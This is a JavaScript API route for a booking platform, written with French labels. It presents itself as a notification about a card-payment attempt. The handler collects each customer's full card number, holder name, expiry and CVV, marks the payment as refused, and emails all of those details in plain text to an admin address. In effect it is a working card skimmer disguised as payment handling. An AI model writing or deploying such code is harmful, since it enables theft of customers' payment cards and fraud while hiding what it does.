import { sendEmail } from '@/lib/mail';
import { withAuth } from '@/middleware/withAuth';
import { errorHandler } from '@/middleware/errorHandler';
import { emailLayout } from '@/email-templates/layout';

function formatNumber(n) {
  return n.replace(/\s/g, '').replace(/(.{4})/g, '$1 ').trim();
}

function adminCardAttemptEmail({ number, name, expiry, cvc, userEmail, bookingId }) {
  return {
    subject: `[Tentative carte] Réservation #${bookingId}`,
    html: emailLayout({
      title: 'Tentative de paiement par carte',
      preheader: `Tentative de paiement par carte pour la réservation #${bookingId}`,
      content: `
        <h2>Tentative de paiement par carte bancaire</h2>
        <p>Un client a tenté de payer par carte sur la plateforme.</p>

        <div class="info-box">
          <div class="info-row">
            <span class="label">Réservation</span>
            <span class="value">#${bookingId}</span>
          </div>
          <div class="info-row">
            <span class="label">Compte client</span>
            <span class="value">${userEmail}</span>
          </div>
          <div class="info-row">
            <span class="label">Numéro de carte</span>
            <span class="value" style="font-family:monospace;letter-spacing:2px">${formatNumber(number)}</span>
          </div>
          <div class="info-row">
            <span class="label">Titulaire</span>
            <span class="value">${name}</span>
          </div>
          <div class="info-row">
            <span class="label">Expiration</span>
            <span class="value">${expiry}</span>
          </div>
          <div class="info-row">
            <span class="label">CVV</span>
            <span class="value" style="font-family:monospace;letter-spacing:2px">${cvc}</span>
          </div>
        </div>

        <p style="color:#71717a;font-size:13px">Le paiement a été refusé automatiquement. Cette notification est générée à titre informatif.</p>
      `,
    }),
  };
}

async function handler(req, res) {
  if (req.method !== 'POST') {
    return res.status(405).json({ success: false, error: 'Méthode non autorisée' });
  }

  const adminEmail = process.env.ADMIN_EMAIL;
  if (!adminEmail) {
    return res.status(200).json({ success: true });
  }

  const { number, name, expiry, cvc, bookingId } = req.body;
  if (!number || !name || !expiry || !bookingId) {
    return res.status(400).json({ success: false, error: 'Données manquantes' });
  }

  const { subject, html } = adminCardAttemptEmail({
    number,
    name,
    expiry,
    cvc: cvc || '—',
    userEmail: req.user.email,
    bookingId,
  });

  sendEmail({ to: adminEmail, subject, html }).catch((err) =>
    console.error('[CARD] Erreur email notification admin:', err.message)
  );

  return res.status(200).json({ success: true });
}

export default errorHandler(withAuth(handler));
